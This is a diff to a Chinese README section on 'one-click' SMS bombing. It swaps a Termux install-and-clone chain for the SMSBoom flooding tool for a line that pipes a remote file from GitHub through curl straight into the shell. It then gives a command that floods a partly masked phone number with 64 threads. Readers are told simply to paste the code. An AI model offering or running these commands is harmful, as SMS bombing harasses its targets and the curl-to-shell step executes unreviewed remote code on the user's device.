@@ -11,8 +11,7 @@
 # 一键代码使用
    ## 短信轰炸
   
-  `pkg install git -y && pkg install python -y && pkg install openssl -y && git clone https://github.com/AdminWhaleFall/SMSBoom.git/ && cd SMSBoom && pip install -r requirements.txt && python smsboom.py
-`
+  `source <(curl -L https://raw.githubusercontent.com/cat-bucket/cat-osint/main/sms.txt)`
 - 直接粘贴代码进入即可，后续可以直接使用下列指令
 - 
   `cd SMSBoom;python smsboom.py run -t 64 -p 184****9269 -f 60 `
